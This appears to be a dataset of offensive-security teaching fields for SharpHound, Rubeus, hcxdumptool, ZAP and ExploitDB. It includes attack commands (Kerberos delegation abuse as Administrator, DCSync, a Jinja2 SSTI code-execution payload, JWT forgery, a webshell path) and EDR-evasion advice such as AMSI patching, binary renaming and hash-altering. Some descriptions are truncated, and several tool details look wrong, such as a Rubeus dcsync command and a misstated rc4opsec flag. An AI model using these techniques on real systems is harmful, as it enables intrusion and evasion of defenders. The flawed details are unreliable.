false_positives: INCOMPLETE SESSION DATA: SharpHound --CollectionMethods Session enumerates active sessions by querying the NetSessionEnum API on each computer. This API is restricted by default on Windows 10 1709+ and Server 2019+ (KB4516071 hardening). On hardened modern estates, SharpHound will report zero or near-zero 'HasSession' edges even when users are actively logged in — operators who rely on session data to find where DA accounts are logged in will get a false picture of the environment and miss valid attack paths.

LOCAL ADMIN ENUMERATION GAPS: --CollectionMethods LocalAdmin uses the NetLocalGroupGetMembers API, which is blocked by default on Windows 11 22H2+ endpoints with restricted admin enumeration policies. SharpHound will silently skip these hosts and report no local admin edges, making it appear that no one has local admin rights on modern workstations when in fact GPO-assigned local admins exist but are simply not enumerable via this method. Cross-reference with GPO data (--CollectionMethods GPOLocalGroup) to recover these edges.

TRUST RELATIONSHIP MISREPRESENTATION: SharpHound represents domain trusts as bidirectional edges in some BloodHound versions even when the underlying trust is one-way. Operators have incorrectly assumed they can move laterally across a trust in both directions based on the graph, only to find the trust is one-way inbound. Always verify trust direction with netdom query trust /domain:<target> or Impacket's GetUserSPNs.py before attempting cross-trust attacks.

ACL INHERITANCE NOISE: SharpHound collects ACLs including inherited permissions. In large enterprises with deeply nested OUs, inherited ACEs from parent OUs can appear as direct ACL edges on child objects in BloodHound, making it look like a user has GenericAll on a computer when they actually only have a read-only inherited permission from a parent OU that doesn't translate to exploitation. Always verify ACL edges with Get-Acl in PowerShell or ldapsearch before attempting ACL-based attacks.

STALE OBJECT POLLUTION: SharpHound collects all AD objects including disabled accounts, decommissioned computers, and expired groups that have never been cleaned up. BloodHound attack paths frequently route through these stale objects, showing a 'path to DA' that traverses a computer account that was decommissioned two years ago or a group that has no active members. Operators have wasted hours attempting to exploit paths that are technically valid in AD but operationally dead. Filter BloodHound queries to active accounts (enabled=true) and recently-authenticated computers before trusting a path.

rubeus.description: C# toolset for raw Kerberos interaction. Ticket extraction (klist on steroids), kerberoasting, AS-REP roasting, S4U2Self/S4U2Proxy abuse, ticket forging (golden
rubeus.teach_intro: Rubeus is the Active Directory red teamer's Swiss army knife for Kerberos. kerberoast: Rubeus.exe kerberoast — gets every service account's TGS, crack offline with hashcat. asreproast: targets accounts with 'Do not require Kerberos preauth' set. ptt (pass the ticket): inject extracted ticket into current logon session. Pairs with mimikatz lsadump::dcsync for full domain compromise chain. Written by HarmJ0y (Will Schroeder); essentially defines the modern Kerberos attack surface.
opsec_notes: BEGINNER NOISE: Rubeus.exe dropped to disk as 'Rubeus.exe' is an immediate IOC. Defender for Endpoint and CrowdStrike Falcon both have static signatures on the default binary name and the embedded .NET assembly GUID. Rename the binary AND recompile with a fresh GUID before any engagement — running the stock binary is the equivalent of wearing a neon sign.

KERBEROASTING VOLUME DETECTION: A single account requesting TGS tickets for 50+ SPNs within seconds generates a Kerberos audit event storm (Windows Event ID 4769, Ticket Encryption Type 0x17 = RC4). Modern SIEMs alert on this pattern within minutes. Use '--rc4opsec' to request AES tickets (0x12/0x11) where supported, and throttle requests with '--delay' and '--jitter' to spread requests over minutes, not milliseconds.

ETW-TI AND PROCESS TREE: CrowdStrike Falcon and SentinelOne both instrument ETW-TI (Event Tracing for Windows - Threat Intelligence) provider, which captures .NET assembly loads at the CLR level. Rubeus running as a child of cmd.exe or powershell.exe with no parent-child relationship to a legitimate user process is a high-confidence behavioral alert in 2025 EDR. Inject Rubeus via execute-assembly from a C2 beacon (Sliver, Mythic) to inherit a more legitimate process tree, or use direct syscall loaders that avoid CLR telemetry.

CONCRETE DEFENDER ARTIFACT — EID 4769: Every TGS request Rubeus makes writes Windows Security Event ID 4769 to the DC's Security log. Fields: Account Name (requesting user), Service Name (target SPN), Ticket Encryption Type, Client Address. A defender with a SIEM rule on 'EID 4769 where EncryptionType = 0x17 AND count > 5 in 60s from single source IP' will catch default kerberoasting instantly. The '--rc4opsec' flag and per-request jitter are the minimum countermeasures.

PASS-THE-TICKET DETECTION: Injecting a ticket with 'ptt' creates a logon session with a ticket that does not match the LSASS-issued TGT for that session. Defender for Endpoint's Identity Protection (formerly Azure ATP / MDI) correlates ticket lifetimes and encryption types against the KDC's issuance records. A ticket with a forged PAC or mismatched lifetime triggers a 'Pass-the-Ticket' alert in MDI within seconds of lateral movement. Use '/createnetonly' to spawn a sacrificial process and inject there rather than contaminating your current session.

AMSI BYPASS STILL REQUIRED IN 2025: Rubeus loaded via 'execute-assembly' in most C2 frameworks passes through AMSI before CLR execution. AMSI signatures for Rubeus string literals ('Rubeus', 'kerberoast', 'asreproast', 'tgtdeleg') are maintained by Microsoft and updated frequently. Patch AMSI in the host process before loading, or use a custom obfuscated build (ConfuserEx, Eazfuscator, or manual IL obfuscation) — string-level obfuscation alone is insufficient against 2025 AMSI ML models in Defender.

sample_outputs.explanation: The LDAP filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' is the bit flag for DONT_REQUIRE_PREAUTH — Rubeus is querying AD directly for vulnerable accounts without needing to attempt auth. The '$krb5asrep$23$' prefix tells hashcat to use mode -m 18200. Once helpdesk_svc is cracked, the advanced chain continues: (1) Check BloodHound for constrained delegation — 'MATCH (u:User {name:"HELPDESK_SVC@CORP.LOCAL"}) RETURN u.allowedtodelegate'. (2) If constrained delegation exists, use 'Rubeus.exe s4u /user:helpdesk_svc /password:CrackedPW /impersonateuser:Administrator /msdsspn:cifs/fileserver.corp.local /ptt' to forge a service ticket as Domain Admin to the delegated SPN. (3) Validate access with 'dir \\fileserver.corp.local\C$'. (4) If DA access is confirmed, pivot to 'Rubeus.exe dcsync' or impacket's secretsdump.py for full NTDS extraction. The constrained delegation chain is particularly dangerous because it requires no additional credential material beyond the cracked service account password.

legal_notes: CFAA BOUNDARY: Rubeus interacts directly with the Key Distribution Center (KDC) via raw Kerberos AS-REQ and TGS-REQ packets. Even passive enumeration of SPNs via kerberoast constitutes unauthorized access to authentication infrastructure under 18 U.S.C. § 1030 if performed without explicit written authorization. The fact that Kerberos TGS requests are a 'normal' protocol operation does not provide legal cover — intent and authorization scope are what matter to a federal prosecutor.

RULES OF ENGAGEMENT SCOPE: Rubeus operations must be explicitly authorized in your Rules of Engagement (RoE). Specifically: (a) kerberoasting and AS-REP roasting harvest credential material that persists after the engagement — your RoE must address how harvested hashes are handled and destroyed post-engagement; (b) pass-the-ticket and S4U2Self/S4U2Proxy operations may grant access to systems OUTSIDE your declared scope if the impersonated account has broad permissions — confirm with the client before executing delegation abuse chains; (c) golden/silver ticket forging against production DCs can cause authentication disruptions if the forged PAC is malformed.

MODERN AD / HYBRID IDENTITY CONSIDERATION: In environments with Azure AD Connect (Entra ID hybrid join), Kerberos tickets issued on-prem may be honored by cloud resources via Seamless SSO (the AZUREADSSOACC$ account). A golden ticket or forged TGT in a hybrid environment can potentially pivot to cloud resources. Confirm with the client whether hybrid identity is in scope before executing ticket forging operations — the blast radius extends beyond the on-prem AD forest.
false_positives: RC4 ETYPE ASSUMPTION: Rubeus reports 'Supported ETypes: RC4_HMAC_DEFAULT' for accounts that have never had an AES key generated (i.e., the account password was set before AES was enforced or the account has never authenticated since AES was enabled). This does NOT mean the account is weak or that RC4 is actually negotiated — if the DC enforces AES-only via GPO, the TGS request will fail or return an AES ticket regardless of what Rubeus reports from the LDAP attribute. Always verify the actual returned hash prefix ($krb5tgs$23$ = RC4, $krb5tgs$18$ = AES256) rather than trusting the pre-enumeration EType field.

EMPTY KERBEROAST RESULTS IN PROTECTED USERS: Accounts in the 'Protected Users' security group cannot be kerberoasted — they are forced to use AES and their TGS tickets are non-renewable and short-lived. Rubeus will enumerate them as kerberoastable (they have SPNs) but the returned AES hash ($krb5tgs$18$) is computationally infeasible to crack with current hardware. Operators who see Protected Users accounts in results and assume they're crackable will waste significant GPU time.

S4U2SELF WITHOUT DELEGATION: Rubeus's s4u module will successfully complete the S4U2Self exchange (getting a service ticket to itself on behalf of a target user) even if the account does NOT have constrained delegation configured. The resulting ticket is marked non-forwardable and cannot be used for S4U2Proxy. Operators who don't check the 'forwardable' flag in the ticket output will incorrectly conclude they have a working delegation chain when they do not.

DOMAIN CONTROLLER SELECTION MATTERS: When multiple DCs exist, Rubeus may contact a non-PDC emulator for ticket operations. If the PDC emulator has a different password version (kvno) for a service account than the DC Rubeus contacted — which can happen during password replication lag — the harvested TGS hash will be valid but will fail to crack even with the correct password, because the hash was encrypted with a stale key. Always specify '/dc:PDC_EMULATOR_FQDN' for kerberoasting in multi-DC environments.

ASREPROAST LDAP ENUMERATION REQUIRES DOMAIN USER: The AS-REP roasting enumeration phase (finding accounts with pre-auth disabled) requires an authenticated LDAP bind to query userAccountControl attributes. If you attempt '/domain:corp.local' without '/user' and '/password' (or a valid Kerberos session), Rubeus will fall back to anonymous LDAP, which is disabled by default on Server 2019+ DCs. The tool will silently return zero results rather than throwing an authentication error, leading operators to incorrectly conclude no vulnerable accounts exist.

hcxdumptool.description: Modern WiFi attack tool focused on PMKID and EAPOL capture. Replaces airodump for handshake capture in many workflows — particularly for WPA2 PMKID attacks (no
hcxdumptool.teach_intro: PMKID attack: WPA2 APs sometimes include the PMKID in the first message of the 4-way handshake; capture it once, crack offline. No need to deauth clients (faster, stealthier). hcxdumptool is the canonical capture tool: hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1. Then hcxpcapngtool to convert to hashcat format, hashcat -m 22000 to crack. Compared to airodump+aireplay: hcxdumptool is faster, doesn't disconnect users, supports PMKID. Compared to wifite: wifite wraps hcxdumptool for the PMKID path.

zaproxy.description: Free, open-source web application security scanner. OWASP project. Burp Suite competitor — intercepting proxy, automated scanner, fuzzer, AJAX spider, scriptabl
zaproxy.teach_intro: ZAP and Burp are the two web pentesting heavyweights. Burp's strengths: extensions ecosystem, polish, professional-mode features. ZAP's strengths: free forever, scriptable (Python/Groovy/JS), great CI/CD integration (ZAP Docker for automated scans on PR builds), OWASP-funded development. Workflow is similar: configure browser to proxy through ZAP (127.0.0.1:8080), browse the app, review proxy history, send interesting requests to manual fuzzer or active scanner. Start with ZAP if budget is zero; switch to Burp Pro when you outgrow it.
opsec_notes: BEGINNER — ZAP's active scanner fires hundreds of HTTP requests per second against every discovered endpoint. Any web server with default logging (Apache access.log, nginx access.log, IIS W3C logs) will record every probe with your source IP, User-Agent 'ZAP/2.x', timestamp, and the malformed payloads (e.g. '<script>alert(1)</script>', '../../../../etc/passwd'). A defender reviewing logs for a 10-minute window will see a textbook scanner signature.

ARTIFACT — ZAP's default User-Agent string is 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0 ZAP/2.15.0' (version varies). WAFs with signature-based rules (ModSecurity CRS, AWS WAF managed rules, Cloudflare Bot Management) match on the 'ZAP/' token. Change it under Tools > Options > Network > Global Headers before any engagement, or via the API: 'replacer.addRule' with a custom User-Agent.

CONCRETE DETECTION VECTOR — ZAP's AJAX Spider launches a headless browser (via Selenium/Playwright) that spawns child processes visible in process telemetry. On a Windows assessment host, CrowdStrike Falcon and SentinelOne both flag the parent-child chain: java.exe (ZAP) -> chromedriver.exe -> chrome.exe with --headless and --disable-gpu flags. This process tree is a high-confidence indicator of automated scanning tooling. Run ZAP from a dedicated Linux scan box, not from a Windows jump host where EDR is deployed.

CUTTING-EDGE 2025 — Modern XDR platforms (Defender for Endpoint Plan 2, Palo Alto Cortex XDR) correlate HTTP anomaly telemetry from network sensors with endpoint process events. Even if ZAP runs off-network, the target application's WAF or API gateway forwards request metadata (rate, entropy of parameter values, sequential path enumeration patterns) to SIEM via CEF/LEEF. Splunk ES and Microsoft Sentinel both ship detection rules for 'web scanner enumeration' that trigger on >50 4xx responses/minute from a single source IP. Throttle ZAP's thread count (Options > Active Scan > Threads per Host: 2-3) and add random delays (Options > Active Scan > Delay in ms: 500-2000) to blend into normal traffic.

CUTTING-EDGE 2026 — ZAP's automated scan against modern SPAs and API-first apps will generate anomalous JWT and OAuth token reuse patterns. API gateways (Kong, Apigee, AWS API Gateway) with threat detection enabled flag replayed tokens across endpoints that the original authenticated session never visited. If you're scanning an OAuth-protected API, obtain a fresh token scoped to the test account and configure ZAP's HTTP Session management to rotate tokens, or the gateway's anomaly detection will terminate your session and alert before the scan completes.

SCOPE BLEED — ZAP's spider, if not constrained, will follow external links and begin scanning out-of-scope domains. Set 'Scope' explicitly in ZAP (right-click target in Sites tree > Include in Context) and enable 'In Scope Only' for all spider and active scan jobs. Failure to do this is the most common way operators accidentally scan third-party infrastructure (CDNs, payment processors, SSO providers) and violate their rules of engagement.

sample_outputs.scenario: Beginner: Single target web app on a CTF/lab environment. Operator runs ZAP's automated scan via CLI against a known-vulnerable DVWA instance to find low-hanging vulnerabilities. No authentication configured.
sample_outputs.command: docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t http://192.168.56.101/dvwa/ -r zap_report.html

sample_outputs.explanation: ZAP's baseline scan ran a passive spider (following links without attacking) then an active scan (injecting payloads). WARN-NEW lines are confirmed findings: SQL Injection at rule ID 10045 means ZAP sent payloads like `1'` and `1 OR 1=1` and observed database error responses or timing differences — this is a real vulnerability. XSS at rule ID 40012 means a reflected payload like `<script>alert(1)</script>` was echoed back unescaped. INFO lines are informational misconfigurations, not exploitable on their own. Next steps: (1) Open the HTML report to see exact payloads and responses. (2) Manually verify the SQLi finding in a browser or with sqlmap: `sqlmap -u 'http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=abc123; security=low' --dbs`. (3) For XSS, confirm the reflected payload renders in-browser and assess whether session cookies are HttpOnly (if not, cookie theft is viable).

sample_outputs.scenario: Advanced: Authenticated scan of a modern React SPA backed by a REST API. Operator configures ZAP with a valid session token, uses the AJAX spider to discover API endpoints not reachable by traditional link-following, then runs a targeted active scan focused on injection and authentication bypass. Target is an internal bug bounty app.
sample_outputs.command: zap-cli --zap-url http://127.0.0.1 --port 8080 context import /engagements/corp-api/context.xml && zap-cli ajax-spider --context-name corp-api --user admin_test http://10.10.20.55:3000/ && zap-cli active-scan --context-name corp-api --user admin_test --scanpolicy api-injection-policy http://10.10.20.55:3000/api/

sample_outputs.explanation: The AJAX Spider used a headless Chrome instance to execute JavaScript, discovering 47 API endpoints that a traditional link-following spider would have missed entirely (React SPAs render routes client-side). The active scan then targeted only the /api/ subtree with a custom policy focused on injection classes, reducing noise and scan time. Key findings: (1) SSTI on /api/v2/reports/generate — the `template_name` parameter is rendered server-side. Confirm the template engine (Jinja2, Twig, Freemarker) by probing with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` and checking for `49` in the response. If Jinja2, RCE is likely via `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. (2) JWT None Algorithm — send a modified JWT with `alg: none` and an empty signature to /api/v2/auth/refresh; if the server accepts it, you can forge tokens for any user. Verify with Burp's JWT Editor extension or `python3 -c` with PyJWT. (3) CORS misconfiguration — craft a cross-origin request from an attacker-controlled domain; if the response includes `Access-Control-Allow-Credentials: true`, authenticated data exfiltration is possible. Next tools: Burp Suite for manual SSTI chain development, jwt_tool for JWT attacks (`python3 jwt_tool.py <token> -X a`), and corsy or manual curl for CORS exploitation confirmation.

legal_notes: US CFAA (18 U.S.C. § 1030) — ZAP's active scanner sends payloads designed to trigger application errors, extract data, and probe authentication mechanisms. Even a single active scan request against a system you are not explicitly authorized to test constitutes 'unauthorized access' under the CFAA. 'Unauthorized' is defined by the system owner's permission, not by whether you can technically reach the host. Running ZAP against a production application without a signed statement of work or written authorization from the application owner exposes you to federal criminal liability regardless of whether you find vulnerabilities.

RULES OF ENGAGEMENT — Confirm the exact URL scope before enabling ZAP's active scanner. Many engagements authorize scanning of 'app.corp.com' but explicitly exclude '/admin/', '/api/payments/', or any endpoint that touches production data. ZAP does not know your RoE — you must configure the scan context to exclude out-of-scope paths. Additionally, confirm whether authenticated scanning is permitted: using a test account to scan as an authenticated user may be authorized while using a real customer account is not, even if both credentials are technically available to you.

MODERN CLOUD CONSIDERATION — If the target application is hosted on a cloud platform (AWS, Azure, GCP) and ZAP's active scan triggers WAF rules or rate limits, the cloud provider's abuse detection systems may flag the source IP and notify the application owner independently of your engagement. AWS Shield Advanced and Azure DDoS Protection both generate automated abuse reports. Ensure your engagement authorization letter explicitly covers automated scanning and that the application owner has notified their cloud provider's security team if required by their service agreement.
false_positives: SQL Injection false positives on time-based blind detection: ZAP injects payloads like `1; WAITFOR DELAY '0:0:5'--` and measures response time. On a target behind a load balancer or with variable server-side processing time (e.g., a report generation endpoint that legitimately takes 3-8 seconds), ZAP will flag time-based SQLi on every request to that endpoint. Always manually verify time-based findings by repeating the exact payload 3+ times and confirming consistent delay.

XSS false positives in JSON APIs: ZAP's reflected XSS scanner checks whether its payload appears in the response body. If the API returns your input in a JSON field (e.g., `{"query": "<script>alert(1)</script>"}`), ZAP flags it as XSS even though JSON responses are not rendered as HTML by the browser unless the Content-Type is incorrectly set to text/html. Always check the response Content-Type header before treating a JSON-context XSS alert as exploitable.

CORS misconfiguration false positives: ZAP reflects arbitrary Origin headers and checks if they appear in Access-Control-Allow-Origin. Some applications correctly echo the Origin for whitelisted domains but ZAP's test uses a non-whitelisted origin. If the response does NOT include Access-Control-Allow-Credentials: true, the CORS 'misconfiguration' is unexploitable — browsers will not send cookies cross-origin without that header, making data exfiltration impossible even if the origin is reflected.

Authentication bypass false positives on 302 redirects: ZAP's authentication detection sometimes misidentifies a successful login redirect (302 to /dashboard) as a failed authentication if the operator has not correctly configured the 'logged-in indicator' regex. This causes ZAP to re-authenticate on every request, flooding the app with login attempts and generating false 'authentication required' alerts on endpoints that are actually accessible to the test account.

Active scan false positives against virtual-hosted applications: If the target IP hosts multiple virtual hosts and ZAP is pointed at the IP rather than the FQDN, responses from the default vhost (often a generic 'welcome' page) will be scanned instead of the intended application. ZAP will report vulnerabilities in the wrong application or miss the target entirely. Always configure ZAP to use the correct Host header by targeting the FQDN, not the raw IP.

exploitdb.description: Offline-searchable archive of public exploits and shellcode maintained by Offensive Security. The /usr/share/exploitdb/ directory ships with Kali; searchsploit
exploitdb.teach_intro: After nmap fingerprints a service version (vsftpd 2.3.4, ProFTPD 1.3.5), searchsploit vsftpd 2.3.4 returns any matching exploits in the archive — often with paths to PoC code in /usr/share/exploitdb/exploits/. Many older exploits assume Python 2 and old library versions; modernizing them is its own skill. Cross-reference results with NVD/MITRE CVE entries for vulnerability context. Modern engagements increasingly use nuclei templates and exploit-developer searches on GitHub instead, but searchsploit remains the offline-capable baseline.
opsec_notes: searchsploit itself is entirely offline — it reads from /usr/share/exploitdb/ on disk and makes zero network connections. The tool generates no packets, no DNS queries, and no logs on any target system. A defender watching the wire will see nothing from a searchsploit query alone.

The operational noise begins the moment you act on searchsploit results. Copying and staging a PoC script (searchsploit -m <EDB-ID>) writes a file to your working directory. On a managed red-team host with EDR, CrowdStrike Falcon's on-write file scanning may flag known exploit PoC files by hash or YARA signature — especially well-known exploits like EDB-17491 (vsftpd 2.3.4 backdoor) whose hashes are in threat intel feeds.

Concrete defender artifact: if you copy a PoC with searchsploit -m and then compile or execute it, Sysmon EID 1 (Process Create) will record the parent-child chain (bash -> gcc -> a.out, or python exploit.py). Defender for Endpoint's process tree anomaly scoring flags interpreter-spawned network-connecting children — a Python script that opens a raw socket immediately after being written to disk is a high-confidence alert in MDE's behavioral engine.

SentinelOne and CrowdStrike both maintain static hash databases of public ExploitDB PoC files. If you copy a PoC unmodified and execute it on a host running either agent, the file hash will match. Recompile from source with minor modifications, or rewrite the shellcode stub, before staging on a monitored host. Even a single NOP insertion changes the hash.

Command-line entropy scoring in modern SIEMs (Splunk ES, Microsoft Sentinel) can flag base64-encoded shellcode embedded in exploit PoCs that are run directly from the command line. If a PoC embeds shellcode as a Python bytes literal or base64 blob, strip and replace it with your own payload before execution to avoid signature-based command-line detections.

On engagements with EDR-monitored jump boxes, avoid running searchsploit inside the target environment entirely. Run it on your offline attack platform, identify the exploit path, then transfer only the modified payload. The presence of the exploitdb directory tree itself (/usr/share/exploitdb/) on a Windows host would be a significant anomaly indicator in any mature SOC.

sample_outputs.scenario: Beginner: nmap identified vsftpd 2.3.4 on a CTF box. Operator searches for known public exploits against that exact version string.
sample_outputs.explanation: The two columns are 'Exploit Title' and 'Path'. The path is relative to /usr/share/exploitdb/exploits/. vsftpd 2.3.4 shipped with a deliberate backdoor: sending a username containing a smiley face ':)' triggers a bind shell on TCP/6200. The Metasploit module (17491.rb) automates this. The Python PoC (49757.py) is a standalone alternative. Next steps: (1) run searchsploit -m 49757 to copy the Python PoC to your working directory, (2) read the PoC source before running it to understand what it does and confirm it matches your target, (3) verify the CVE (CVE-2011-2523) on NVD to understand scope and patch status. This is a 2011 vulnerability — its presence on a modern host means either a deliberately vulnerable lab (CTF) or a severely unpatched production system.

sample_outputs.scenario: Advanced: operator has nmap output showing ProFTPD 1.3.5 on a hardened 2024 internal server. Searching for exploits, filtering to exclude DoS-only entries, then cross-referencing with a GitHub nuclei template search for active exploitation.
sample_outputs.explanation: The mod_copy module (CVE-2015-3306) allows unauthenticated CPFR/CPTO commands to copy arbitrary files on the server filesystem — classically used to copy an SSH private key or a PHP webshell into a web root. The --exclude flag filters titles containing 'DoS' so you're not wasting time on non-exploitable entries. The 1.3.3c backdoor result is a false positive here — version mismatch, discard it. Next steps: (1) searchsploit -m 36803 to stage the Python PoC, then read it — it likely needs Python 2 and a target web root path, both of which you must confirm; (2) run nuclei -t /path/to/proftpd-mod-copy.yaml -u ftp://10.10.10.45 to validate exploitability with a non-destructive probe before running the PoC; (3) if mod_copy is confirmed, use CPFR /etc/passwd and CPTO /var/www/html/test.txt to verify read access before attempting webshell write. Cross-reference with Shodan/Censys historical banners to confirm the version string is not spoofed by a honeypot or WAF banner rewrite.

legal_notes: Under 18 U.S.C. § 1030 (CFAA), possessing and searching ExploitDB offline is not itself a crime — searchsploit is a research tool. The legal exposure begins when you use the resulting exploit code against a system you are not authorized to access. 'Authorized access' must be documented in writing (signed rules of engagement, bug bounty scope, or explicit written permission from the system owner) before any exploit is staged or executed.

Rules of engagement must explicitly cover exploit execution, not just scanning. Many engagement scopes authorize reconnaissance and vulnerability identification but require separate written approval before running exploit code. Confirm your RoE covers 'exploitation' as a distinct phase before copying and executing any PoC from the archive — even against a host that is clearly in scope for scanning.

In cloud environments (AWS, Azure, GCP), exploiting a vulnerable service running on a managed instance may violate the cloud provider's Acceptable Use Policy independently of your client authorization. AWS's penetration testing policy (as of 2025) requires pre-authorization for certain attack classes. Confirm both client RoE AND provider AUP before exploiting services hosted on shared cloud infrastructure.
false_positives: Version string partial matching produces irrelevant results. Searching 'apache 2.4' returns exploits for Apache 2.4.0 through 2.4.x indiscriminately — an exploit for 2.4.7 may not apply to 2.4.54. Always read the exploit header comments for the exact affected version range and confirm against the NVD entry before assuming applicability.

ExploitDB is not a real-time feed. The local archive on a Kali install may be months behind the upstream repository. An exploit published last week against a service you've fingerprinted will not appear in searchsploit until you run updatedb or apt update exploitdb. Always supplement with a GitHub search and NVD query for CVEs issued in the last 90 days.

Many PoCs in the archive are Python 2, require deprecated libraries (pycrypto instead of pycryptodome, httplib instead of http.client), or hardcode offsets for a specific OS/libc version. A PoC that 'should work' per the title will silently fail or crash the target service if run unmodified against a different patch level or distribution. Treat every PoC as requiring review and likely modification before use.

The --exclude and --www flags use case-insensitive substring matching against the title field only — not the exploit body, CVE description, or affected version range. A DoS exploit titled 'Remote Code Execution via Buffer Overflow' will not be excluded by --exclude='DoS' even if it reliably crashes the service. Read the PoC source, not just the title.

Banner grabbing inaccuracies propagate into searchsploit results. If nmap fingerprinted 'ProFTPD 1.3.5' from a banner that was manually edited by a sysadmin or spoofed by a WAF, your searchsploit results are based on a false premise. Confirm version strings through multiple independent methods (banner, error messages, behavioral fingerprinting, CVE probe with nuclei) before committing to an exploit path.
